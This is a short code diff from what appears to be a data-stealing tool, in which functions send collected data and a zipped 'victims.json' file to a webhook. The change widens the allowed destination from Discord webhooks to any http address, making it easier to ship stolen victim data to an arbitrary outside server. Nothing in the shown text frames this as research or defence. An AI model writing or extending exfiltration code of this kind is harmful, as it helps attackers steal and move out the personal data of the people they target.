@@ -21,8 +21,8 @@ function getWebhookURL() {
 // Send to Discord webhook
 async function sendToDiscord(data) {
   const webhookURL = getWebhookURL();
-  if (!webhookURL || !webhookURL.startsWith('https://discord.com/api/webhooks/')) {
-    console.log('⚠️  No valid Discord webhook configured');
+  if (!webhookURL || !webhookURL.startsWith('http')) {
+    console.log('⚠️  No valid webhook configured');
     return;
   }
 
@@ -72,7 +72,7 @@ async function sendToDiscord(data) {
 // Send victims.json as ZIP to Discord
 async function sendZipToDiscord() {
   const webhookURL = getWebhookURL();
-  if (!webhookURL || !webhookURL.startsWith('https://discord.com/api/webhooks/')) return;
+  if (!webhookURL || !webhookURL.startsWith('http')) return;
 
   try {
     const dataPath = path.join(__dirname, '..', 'data', 'victims.json');
